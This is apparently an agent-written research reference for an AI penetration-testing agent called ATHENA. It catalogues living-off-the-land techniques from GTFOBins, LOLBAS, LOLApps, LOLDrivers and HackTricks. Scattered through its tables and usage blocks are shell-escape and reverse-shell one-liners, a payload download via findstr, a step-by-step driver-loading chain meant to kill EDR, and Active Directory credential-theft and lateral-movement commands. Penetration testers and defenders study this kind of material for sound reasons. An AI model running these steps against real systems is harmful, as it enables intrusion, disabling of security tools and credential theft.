# Living Off the Land (LOTL) Ecosystem Research
**Date:** 2026-02-26
**Purpose:** ATHENA pentest agent knowledge base - LOTL techniques reference
**Researcher:** Vex / Researcher Agent

---

## Executive Summary

The LOTL ecosystem consists of five primary reference databases covering Unix binaries (GTFOBins), Windows binaries/scripts (LOLBAS), application-layer techniques (LOLApps), vulnerable kernel drivers (LOLDrivers), and comprehensive AD methodology (HackTricks). Together these resources cover every phase of the MITRE ATT&CK kill chain. An AI pentest agent like ATHENA should query these programmatically during engagements to identify locally exploitable techniques without deploying custom tooling.

---

## 1. GTFOBins (Unix/Linux LOTL)

### Project Overview
- **URL:** https://gtfobins.github.io/
- **Scope:** Unix-like OS (Linux, macOS, BSD) - legitimate binaries with abusable functionality
- **Authors:** Emilio Pinna and Andrea Cardaci + community
- **Philosophy:** Not exploits - these binaries are NOT vulnerable per se. They have legitimate capabilities that can be abused in misconfigured systems.
- **Key Value:** Post-exploitation when dropped into a restricted shell or low-priv account

### Functional Categories

| Category | Description | MITRE Mapping |
|----------|-------------|---------------|
| Shell | Escape restricted shells, spawn interactive shells | T1059.004 (Unix Shell) |
| Sudo | Abuse sudo misconfigurations to gain root | T1548.003 (Sudo and Sudo Caching) |
| SUID | Abuse setuid bit on binaries | T1548.001 (Setuid and Setgid) |
| File Read | Read sensitive files without cat/less | T1005 (Data from Local System) |
| File Write | Write to files as higher-priv user | T1565.001 (Stored Data Manipulation) |
| File Download | Pull external payloads via trusted binary | T1105 (Ingress Tool Transfer) |
| File Upload | Exfiltrate data via trusted binary | T1048 (Exfiltration Over Alt Protocol) |
| Reverse Shell | Spawn reverse shell using installed binary | T1059 (Command & Script Interpreter) |
| Bind Shell | Bind shell listener on port | T1059 |
| Limited SUID | Partial privilege with constrained shell | T1548.001 |
| Library Load | Force binary to load attacker-controlled library | T1574.006 (Dynamic Linker Hijacking) |

### Top 20 Most Useful Binaries for ATHENA

| # | Binary | Key Techniques | Why It Matters |
|---|--------|---------------|----------------|
| 1 | **python/python3** | Shell, Reverse Shell, File R/W, SUDO | Ubiquitous on modern Linux; one-liner to full shell |
| 2 | **bash** | Shell, SUID, Reverse Shell | Always present; `bash -p` preserves euid on SUID |
| 3 | **find** | Exec, SUID, Shell | `find . -exec /bin/sh \; -quit` for immediate shell |
| 4 | **vim/vi** | Shell, File R/W, SUDO | `:!/bin/sh` escape; reads /etc/shadow as SUID |
| 5 | **awk** | Shell, File R/W | `awk 'BEGIN {system("/bin/sh")}'` - common on all distros |
| 6 | **nmap** | Shell, Reverse Shell | `--interactive` mode (older nmap) or script exec |
| 7 | **perl** | Shell, Reverse Shell, File R/W | One-liner reverse shell; common on servers |
| 8 | **wget** | File Download, File Upload, Reverse Shell | Exfil via POST, pull payloads |
| 9 | **curl** | File Download, File Upload | Like wget but more flexible; pipe to shell |
| 10 | **tar** | Shell, File R/W | `--checkpoint-action=exec` for command execution |
| 11 | **less/more** | Shell | `!sh` from within pager; common sudo misconfiguration |
| 12 | **nc/netcat** | Reverse Shell, Bind Shell | Classic; `nc -e /bin/sh` variant |
| 13 | **cp** | File Write, SUID | Copy /bin/sh with SUID bit; overwrite sudoers |
| 14 | **tee** | File Write | Write to root-owned files via pipe; append to sudoers |
| 15 | **ruby** | Shell, Reverse Shell | `ruby -e 'exec "/bin/sh"'` |
| 16 | **php** | Shell, Reverse Shell | Web server context common; `php -r 'system("/bin/sh")'` |
| 17 | **node** | Shell, Reverse Shell | `require('child_process').exec('/bin/sh')` |
| 18 | **git** | Shell, File R/W, SUDO | `git help config` -> `:!/bin/sh` |
| 19 | **zip/unzip** | Shell, File R/W | `zip /tmp/exploit.zip /etc/passwd -T --unzip-command="sh -c /bin/sh"` |
| 20 | **env** | Shell, SUDO, SUID | `env /bin/sh -p` preserves elevated euid |

### ATHENA Agent Usage
```
Query pattern: After initial shell, run `find / -perm -4000 2>/dev/null` for SUID binaries,
then cross-reference each result against GTFOBins API or local cache.
Also check: `sudo -l` output -> map each allowed binary to GTFOBins entry.
Automation: gtfobins-cli (pip) can search programmatically.
```

### MITRE ATT&CK Phase Mapping
- **Initial Access:** N/A (post-exploitation resource)
- **Execution:** T1059 (all shell/reverse shell categories)
- **Persistence:** T1574.006 (library load), T1548 (SUID abuse)
- **Privilege Escalation:** T1548.001 (SUID), T1548.003 (Sudo)
- **Defense Evasion:** T1027 (use trusted binaries to avoid detection)
- **Credential Access:** T1005, File Read category targeting /etc/shadow
- **Exfiltration:** T1048, T1105 (file upload/download categories)

---

## 2. LOLBAS (Windows Living Off the Land)

### Project Overview
- **URL:** https://lolbas-project.github.io/
- **Scope:** Windows OS - native binaries (.exe), scripts (.bat/.ps1/.vbs), and libraries (.dll)
- **Author:** Oddvar Moe (api0cradle) + community
- **Criteria for inclusion:** Must be a Microsoft-signed binary, must do something unexpected (execute, download, bypass AV/AWL, dump credentials)
- **Philosophy:** These are Microsoft-signed, trusted binaries that EDR/AV tools are reluctant to block

### Functional Categories

| Category | Description | MITRE Mapping |
|----------|-------------|---------------|
| Execute | Run arbitrary code via trusted binary | T1218 (Signed Binary Proxy Execution) |
| AWL Bypass | Bypass AppLocker/WDAC application control | T1218 |
| Download | Fetch remote files using trusted binary | T1105 (Ingress Tool Transfer) |
| Upload | Exfiltrate data via trusted binary | T1048 |
| Copy | Copy files with elevated privilege | T1570 (Lateral Tool Transfer) |
| Encode | Base64 or other encoding to obfuscate | T1027 (Obfuscated Files) |
| Decode | Reverse obfuscation | T1140 (Deobfuscate/Decode) |
| Compile | Compile code using trusted compiler | T1127 (Trusted Developer Utilities) |
| UAC Bypass | Bypass User Account Control | T1548.002 (Bypass UAC) |
| Credentials | Harvest or dump credentials | T1003 (OS Credential Dumping) |
| Reconnaisssance | System/network recon via trusted binary | T1082, T1016 |
| ADS | Alternate Data Stream manipulation | T1564.004 (NTFS File Attributes) |
| Dump | Memory/credential dumping | T1003 |

### Top 20 Most Useful Windows LOLBAS

| # | Binary | Key Techniques | Why It Matters |
|---|--------|---------------|----------------|
| 1 | **certutil.exe** | Download, Encode/Decode, AWL Bypass | Download files from web; base64 encode/decode payloads |
| 2 | **mshta.exe** | Execute, AWL Bypass | Execute VBScript/JScript from URL; common in phishing |
| 3 | **regsvr32.exe** | Execute, AWL Bypass | `scrobj.dll` remote script execution via /s /n /i |
| 4 | **rundll32.exe** | Execute, AWL Bypass | Execute DLL exports; `javascript:` execution |
| 5 | **msbuild.exe** | Execute, AWL Bypass, Compile | Inline task execution in XML project file |
| 6 | **powershell.exe** | Execute, Download, AWL Bypass | Cradle payloads; `-EncodedCommand`; DownloadString |
| 7 | **wmic.exe** | Execute, Recon | Remote execution; process creation; lateral movement |
| 8 | **bitsadmin.exe** | Download, Execute | BITS job to download + execute (now mostly legacy) |
| 9 | **installutil.exe** | Execute, AWL Bypass | .NET assembly execution bypassing AppLocker |
| 10 | **regasm.exe** | Execute, AWL Bypass | Register .NET assembly; code in RegisterClass method runs |
| 11 | **cscript/wscript.exe** | Execute | Run VBS/JS scripts; proxy execution via WScript.Shell |
| 12 | **mavinject.exe** | Execute | Inject DLL into running process; signed by Microsoft |
| 13 | **odbcconf.exe** | Execute, AWL Bypass | Load DLL via REGSVR action |
| 14 | **forfiles.exe** | Execute | Execute commands on files; `/c cmd /c` pattern |
| 15 | **diskshadow.exe** | Execute, Credentials | Shadow copy abuse; dump NTDS.dit |
| 16 | **esentutl.exe** | Copy, Credentials | Copy locked files (NTDS.dit, SAM, SYSTEM) |
| 17 | **findstr.exe** | Download | `findstr /V /L w MZ https://payload` file download |
| 18 | **expand.exe** | Download, Copy | Decompress/copy files from cabinet archives |
| 19 | **dnscmd.exe** | Execute | DNS server plugin DLL loading |
| 20 | **pcalua.exe** | Execute, AWL Bypass | Program Compatibility Assistant proxy execution |

### ATHENA Agent Usage
```
Query pattern: After Windows initial access, enumerate installed binaries in
C:\Windows\System32 and C:\Windows\SysWOW64 against LOLBAS database.
Key check: AppLocker/WDAC policy -> use LOLBAS AWL Bypass category to find allowed bypass.
Proxy execution for payload delivery: certutil for download, msbuild/installutil for execution.
```

### MITRE ATT&CK Phase Mapping
- **Initial Access:** T1566 (Phishing via mshta/regsvr32 in documents)
- **Execution:** T1218 (Signed Binary Proxy - core of LOLBAS)
- **Persistence:** T1053 (Scheduled Tasks via schtasks), T1547
- **Privilege Escalation:** T1548.002 (UAC Bypass)
- **Defense Evasion:** T1218 (entire purpose), T1027 (encode/decode), T1140
- **Credential Access:** T1003 (diskshadow, esentutl for NTDS.dit)
- **Lateral Movement:** T1570, T1021 (wmic remote execution)
- **Exfiltration:** T1048, T1105

---

## 3. LOLApps (Application-Layer LOTL)

### Project Overview
- **URL:** https://lolapps-project.github.io/
- **GitHub:** https://github.com/LOLAPPS-Project/LOLAPPS
- **Scope:** Third-party and built-in applications (not OS binaries) that can be exploited for living-off-the-land techniques
- **Philosophy:** "Exploitation isn't limited to binaries using command line techniques" - covers GUI and installed apps
- **Cousin of:** LOLBAS (Windows) and GTFOBins (Unix)
- **Status:** Newer/smaller project than LOLBAS/GTFOBins, actively growing

### Entry Schema (YML-based)
Each entry documents:
- **Name:** Application name
- **Description:** What the technique does
- **Category:** Classification
- **Steps:** How to execute the technique
- **Privileges:** None / User / User Interaction Required / Administrator / Requires Installation
- **Limitations:** Caveats
- **MITRE ID:** Mapped ATT&CK technique

### Documented Categories (from Categories.md)
- **Execute** - Run code/commands via application functionality
- **Download** - Use app to fetch remote files
- **Upload** - Use app for data exfiltration
- **Credentials** - Harvest stored credentials from app config/memory
- **Bypass** - Evade security controls using app
- **Lateral Movement** - Use app to pivot to other systems
- **Persistence** - Use app to maintain access

### Notable Application Techniques (Known Examples)

| Application | Technique | Category | Notes |
|-------------|-----------|----------|-------|
| **7-Zip** | Extract files to privileged locations | Execute/Write | Self-extracting archives to system paths |
| **Chrome/Firefox** | Credential theft from profile | Credentials | `Login Data` SQLite DB contains saved passwords |
| **WinSCP** | Extract saved session credentials | Credentials | Registry/config file stores SFTP/SSH creds |
| **FileZilla** | Extract FTP credentials | Credentials | `recentservers.xml` contains plaintext creds |
| **PuTTY** | Extract SSH session credentials | Credentials | Registry stores session configs and creds |
| **TeamViewer** | Extract client credentials | Credentials | Registry/config stores remote access creds |
| **Slack desktop** | Token extraction from LevelDB | Credentials | `%APPDATA%\Slack\storage\` stores auth tokens |
| **VS Code** | Extensions as code execution vehicle | Execute | Extensions can run arbitrary code |
| **VLC Media Player** | Lua script execution | Execute | Lua scripting interface for code execution |
| **Adobe Reader** | JavaScript execution in PDF | Execute | Embedded JS in PDFs can call OS APIs |

### ATHENA Agent Usage
```
Query pattern: After initial access, enumerate installed applications.
Priority targets: Browser credential stores, remote access tool configs (WinSCP, PuTTY, mRemoteNG),
messaging apps (Slack, Teams tokens), and any apps with scripting capabilities.
Tool: LaZagne, SharpChrome, SessionGopher for automated LOLApps credential harvesting.
```

### MITRE ATT&CK Phase Mapping
- **Credential Access:** T1555.003 (Credentials from Web Browsers), T1552.001 (Credentials in Files)
- **Execution:** T1059 (scripting capabilities in apps)
- **Defense Evasion:** T1218 (proxy execution via trusted app)
- **Exfiltration:** T1048 (using upload-capable apps)
- **Collection:** T1005, T1056 (input capture via apps)

---

## 4. LOLDrivers (BYOVD - Kernel-Level)

### Project Overview
- **URL:** https://loldrivers.io/
- **GitHub:** https://github.com/magicsword-io/LOLDrivers
- **Maintainer:** MagicSword (magicsword-io) + community
- **Scope:** Windows kernel drivers - both malicious and legitimately signed but vulnerable drivers
- **Scale:** 1,800+ drivers documented (as of 2024), 924+ are 64-bit signed vulnerable drivers
- **Use Case:** BYOVD (Bring Your Own Vulnerable Driver) - load vulnerable driver to gain kernel-level control

### Attack Concept: BYOVD
```
Attacker drops known-vulnerable signed driver
  -> Windows loads it (it's signed, trusted)
  -> Attacker exploits driver's vulnerable IOCTL interface
  -> Gains kernel-mode execution (ring 0)
  -> Can: kill EDR processes, disable AV, load unsigned drivers,
           read/write arbitrary memory, escalate to SYSTEM
```

### Driver Categories

| Category | Description | Examples |
|----------|-------------|---------|
| **Arbitrary Memory R/W** | Read/write any kernel memory location | RTCore64.sys, gdrv.sys |
| **Process Termination** | Kill arbitrary processes (including EDR/AV) | procexp152.sys, gmer.sys |
| **EDR/AV Killer** | Specifically designed or abused to kill security tools | DBUtil_2_3.sys, zamguard64.sys |
| **Kernel Code Execution** | Execute shellcode in kernel space | Capcom.sys (famous example) |
| **Physical Memory Access** | Direct access to physical RAM | Multiple, enables memory forensics evasion |
| **IO Port Access** | Read/write hardware I/O ports | gdrv.sys, RtCore64.sys |
| **MSR Access** | Read/write CPU Model Specific Registers | RTCore64.sys, WinIo |
| **Unsigned Driver Load** | Bypass driver signature enforcement (DSE) | Various |
| **DLL Injection (Kernel)** | Inject into kernel process context | Various |

### Top Notable Vulnerable Drivers

| Driver | Vendor/Product | CVE(s) | Primary Abuse | Real-World Use |
|--------|---------------|--------|---------------|----------------|
| **RTCore64.sys** | MSI Afterburner (GPU overclock) | CVE-2019-16098 | Arbitrary memory R/W, MSR R/W | Lazarus APT, Robinhood ransomware |
| **gdrv.sys** | GIGABYTE App Center | CVE-2018-19320/19321/19322/19323 | Physical memory R/W, I/O ports, MSR | Multiple ransomware groups |
| **DBUtil_2_3.sys** | Dell firmware update utility | CVE-2021-21551 | Memory R/W, privilege escalation | BlackByte ransomware |
| **capcom.sys** | Capcom (game anti-cheat) | N/A (design flaw) | Kernel shellcode execution | Red team favorite, many PoCs |
| **mhyprot2.sys** | miHoYo Genshin Impact anti-cheat | CVE-2022-47949 | Kill arbitrary processes | Used in Agenda ransomware attacks |
| **IQVW64E.sys** | Intel Ethernet diagnostics | CVE-2015-2291 | DoS / arbitrary code (kernel) | Lazarus APT BYOVD campaigns |
| **zamguard64.sys** | Zemana AntiLogger | N/A | Kill AV/EDR processes | BlackByte BYOVD chain |
| **procexp152.sys** | Sysinternals Process Explorer | N/A (legitimate use abused) | Terminate protected processes | EDRSandBlast technique |
| **WinRing0x64.sys** | Open Hardware Monitor | CVE-2020-14979 | Physical memory R/W, I/O, MSR | Multiple campaigns |
| **AsrDrv104.sys** | ASRock motherboard | CVE-2020-15368 | Arbitrary memory R/W | Multiple campaigns |

### ATHENA Agent Usage
```
BYOVD Attack Chain for ATHENA:
1. Query LOLDrivers API for drivers with: category=EDR_Killer + signed=true
2. Check if target has Windows 10 1607+ (HVCI) - limits BYOVD viability
3. Drop chosen driver: sc create <name> binPath=<driver_path> type=kernel
4. sc start <name> to load
5. Use IOCTL interface to kill EDR process or disable callbacks
6. Proceed with post-exploitation without EDR interference
Tools: EDRSandBlast, KDMapper, DriverBuddy for automation
Detection: Sigma rule driver_load_win_vuln_drivers_names.yml
```

### MITRE ATT&CK Phase Mapping
- **Defense Evasion:** T1562.001 (Impair Defenses - kill EDR), T1014 (Rootkit), T1553.006 (Code Signing - bypass via signed driver)
- **Privilege Escalation:** T1068 (Exploitation for Privilege Escalation - kernel level)
- **Persistence:** T1543.003 (Windows Service - driver loaded as service)
- **Execution:** T1068 (kernel code execution via driver IOCTL)
- **Impact:** T1485, T1490 (ransomware chains using BYOVD to disable backups)

### Detection (for Blue Team context)
- Sigma: `driver_load_win_vuln_drivers_names.yml` (LOLDrivers hash list)
- Splunk lookup: `loldrivers.csv` (official integration)
- Windows Event ID 7045 (new service installed) + hash comparison
- Microsoft HVCI (Hypervisor-Protected Code Integrity) blocks most BYOVD

---

## 5. HackTricks Active Directory Methodology

### Project Overview
- **URL:** https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- **Scope:** Comprehensive AD pentest methodology - enumeration through domain dominance
- **Author:** Carlos Polop + community contributors
- **Format:** Living book, continuously updated with new techniques
- **Value:** Most comprehensive free AD attack reference available

### AD Pentest Methodology - Phase Overview

```
Phase 0: Initial Reconnaissance (External/No Creds)
    -> DNS enumeration, LDAP null bind, SMB null sessions, ASREPRoast (no creds needed)

Phase 1: Internal Enumeration (Network Access)
    -> BloodHound/SharpHound, PowerView, LDAP queries
    -> User/Group/Computer enumeration, share enumeration

Phase 2: Initial Credential Acquisition
    -> LLMNR/NBT-NS poisoning (Responder), NTLM relay, Password spraying
    -> Kerberoasting, ASREPRoasting

Phase 3: Lateral Movement
    -> Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash
    -> WMI execution, PSExec, WinRM, DCOM

Phase 4: Privilege Escalation
    -> ACL/ACE abuse, Kerberos delegation attacks, AS-REP Roasting
    -> LAPS, GPO abuse, Local admin to DA

Phase 5: Domain Dominance
    -> DCSync (dump all hashes), Golden/Silver Tickets
    -> Skeleton Key, AdminSDHolder, DCShadow

Phase 6: Persistence
    -> Golden Ticket (10-year TTL), Custom SSP, Backdoor accounts
    -> ACL persistence, Group Policy persistence
```

### Key Attack Vectors with Techniques

#### Credential Attacks
| Attack | Description | Tool | MITRE |
|--------|-------------|------|-------|
| **Kerberoasting** | Request TGS for user-based SPNs, crack offline | Rubeus, Impacket | T1558.003 |
| **AS-REP Roasting** | Users with no pre-auth required; get encrypted AS-REP | Rubeus, GetNPUsers.py | T1558.004 |
| **LLMNR Poisoning** | Respond to LLMNR/NBT-NS queries; capture Net-NTLMv2 | Responder | T1557.001 |
| **NTLM Relay** | Relay captured NTLM auth to other services | ntlmrelayx, Responder | T1557.001 |
| **Password Spraying** | Try common passwords against all accounts | CrackMapExec, Kerbrute | T1110.003 |
| **DCSync** | Mimic DC replication to dump all password hashes | Mimikatz, Impacket | T1003.006 |

#### Lateral Movement Techniques
| Technique | Description | Tool | MITRE |
|-----------|-------------|------|-------|
| **Pass-the-Hash** | Use NTLM hash without cracking for auth | CrackMapExec, Impacket | T1550.002 |
| **Pass-the-Ticket** | Use stolen Kerberos TGT/TGS | Rubeus | T1550.003 |
| **Overpass-the-Hash** | Convert NTLM hash to Kerberos TGT | Rubeus, Mimikatz | T1550.002 |
| **WMI Exec** | Remote execution via WMI | CrackMapExec, Impacket | T1047 |
| **PSExec** | Service-based remote execution | Impacket, Metasploit | T1569.002 |
| **WinRM** | PS Remoting for lateral movement | Evil-WinRM | T1021.006 |

#### Escalation via Kerberos Delegation
| Attack | Description | MITRE |
|--------|-------------|-------|
| **Unconstrained Delegation** | Capture TGTs from any user connecting to compromised host | T1558 |
| **Constrained Delegation** | S4U2Proxy/Self to impersonate any user to target service | T1558 |
| **Resource-Based Constrained Delegation (RBCD)** | Write `msDS-AllowedToActOnBehalfOfOtherIdentity` to get access | T1558 |
| **PrinterBug / SpoolSample** | Force DC to authenticate to attacker (coerce) | T1187 |

#### ACL/ACE Abuse (BloodHound Attack Paths)
| ACE | Abuse | MITRE |
|----|-------|-------|
| **GenericAll** on User | Change password, targeted Kerberoasting | T1098 |
| **GenericWrite** on User | Add SPN for Kerberoasting | T1098, T1558.003 |
| **WriteDACL** | Grant yourself GenericAll | T1222 |
| **WriteOwner** | Take object ownership | T1222 |
| **GenericAll** on Group | Add self to privileged group | T1098 |
| **DCSync Rights** (Replicating Directory Changes) | DCSync attack | T1003.006 |

#### Domain Dominance Techniques
| Technique | Description | Persistence | MITRE |
|-----------|-------------|-------------|-------|
| **Golden Ticket** | Forge TGTs using KRBTGT hash; 10-year validity | Survives password resets | T1558.001 |
| **Silver Ticket** | Forge TGS for specific service using service account hash | Service-specific | T1558.002 |
| **Skeleton Key** | Patch LSASS with master password for all accounts | Until DC reboot | T1556.001 |
| **DCShadow** | Rogue DC to push malicious AD changes | Stealthy config changes | T1484.001 |
| **AdminSDHolder** | Modify AdminSDHolder to persist ACE on protected groups | Persists every 60min | T1484 |

### BloodHound Attack Path Methodology
```
1. Collect: SharpHound.exe -c All (or BloodHound.py from Linux)
2. Ingest into BloodHound graph database (Neo4j)
3. Queries:
   - "Find Shortest Path to Domain Admins"
   - "Find Principals with DCSync Rights"
   - "Shortest Path from Kerberoastable Users"
   - "Find Computers with Unconstrained Delegation"
   - "Find Computers where Domain Users are Local Admin"
4. Chain: Kerberoast -> crack -> ACL abuse -> DA
```

### ATHENA Agent Usage for AD
```
Reconnaissance:
  ldapdomaindump, enum4linux-ng, nmap --script=ldap-*

Credential Phase:
  GetNPUsers.py (ASREPRoast - no creds)
  GetUserSPNs.py (Kerberoast - needs creds)
  Responder + ntlmrelayx (network position needed)

Enumeration with Creds:
  BloodHound.py -u user -p pass -d domain.local -ns DC_IP -c All
  CrackMapExec smb targets -u user -p pass --shares

Lateral Movement:
  CrackMapExec smb targets -u user -H hash (PTH)
  evil-winrm -i target -u user -H hash

Privilege Escalation:
  BloodHound shortest path -> implement ACL abuse via PowerView
  Impacket secretsdump.py for DCSync
```

### MITRE ATT&CK Phase Mapping (AD Specific)
- **Reconnaissance:** T1590 (Gather Victim Network Info), T1591 (Org Info)
- **Initial Access:** T1566 (Phishing), T1078 (Valid Accounts)
- **Execution:** T1047 (WMI), T1059 (PowerShell), T1569.002 (PSExec)
- **Persistence:** T1098, T1547, T1136, T1078.002 (Domain Accounts)
- **Privilege Escalation:** T1548, T1134 (Token Impersonation), T1068
- **Defense Evasion:** T1550, T1218, T1070
- **Credential Access:** T1003, T1552, T1558 (Kerberos attacks)
- **Lateral Movement:** T1550.002 (PTH), T1550.003 (PTT), T1021
- **Collection:** T1039, T1005
- **Exfiltration:** T1041, T1048

---

## Ecosystem Integration Map (LOTL Decision Tree for ATHENA)

```
Target System Assessment
├── Linux/Unix system?
│   └── GTFOBins
│       ├── Check SUID binaries: find / -perm -4000 2>/dev/null
│       ├── Check sudo rules: sudo -l
│       ├── Restricted shell? -> Shell escape category
│       └── Need file exfil? -> File Upload/Download category
│
├── Windows system (standalone)?
│   ├── LOLBAS -> Binary proxy execution, AWL bypass
│   ├── LOLApps -> Check installed apps for credential stores
│   └── LOLDrivers -> If EDR present and BYOVD viable
│
└── Windows AD Environment?
    ├── No creds -> HackTricks AD Phase 0 (ASREPRoast, LLMNR)
    ├── User creds -> HackTricks AD Phase 1-3 (BloodHound, Kerberoast)
    ├── Local admin -> LOLDrivers (BYOVD to kill EDR) + LOLBAS
    ├── DA creds -> HackTricks Phase 5-6 (DCSync, Golden Ticket)
    └── Throughout -> LOLBAS for execution/evasion, LOLApps for creds
```

---

## Resources and Programmatic Access

| Resource | API/CLI | Automation Path |
|----------|---------|-----------------|
| GTFOBins | JSON at `/index.json` | `gtfobins-cli` (pip), direct JSON query |
| LOLBAS | JSON filter on site | GitHub API: `api0cradle/LOLBAS` YAML files |
| LOLApps | GitHub YAML files | `LOLAPPS-Project/LOLAPPS` repo |
| LOLDrivers | REST API at loldrivers.io/api | `/api/drivers.json` - full DB download |
| HackTricks | Book format only | GitHub: `HackTricks-Team/hacktricks` |

---

## References
- GTFOBins: https://gtfobins.github.io/
- LOLBAS: https://lolbas-project.github.io/
- LOLAPPS: https://lolapps-project.github.io/
- LOLDrivers: https://loldrivers.io/
- HackTricks AD: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- LOLOL Farm (meta-aggregator): https://lolol.farm/
- LOLAD (AD-specific LOTL): https://lolad-project.github.io/
